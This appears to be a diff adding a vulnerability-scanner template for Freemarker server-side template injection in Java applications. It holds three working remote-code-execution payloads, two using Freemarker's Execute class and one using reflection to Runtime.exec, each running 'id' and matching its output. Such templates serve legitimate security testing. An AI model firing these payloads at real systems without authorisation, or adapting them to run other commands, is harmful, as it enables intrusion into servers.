@@ -1,0 +1,20 @@
+id: m7-ssti-freemarker
+info:
+  name: M7 - SSTI Freemarker RCE (Java)
+  author: Sharlix
+  severity: critical
+  description: Freemarker template injection RCE on Java applications
+  tags: ssti,freemarker,java,rce,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name=${"freemarker.template.utility.Execute"?new()("id")}"
+      - "{{BaseURL}}?q=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}"
+      - "{{BaseURL}}?s=${product.class.forName("java.lang.Runtime").getMethod("exec",product.class.forName("java.lang.String")).invoke(product.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}"
+
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\d+\(.*?\)"
+        part: body
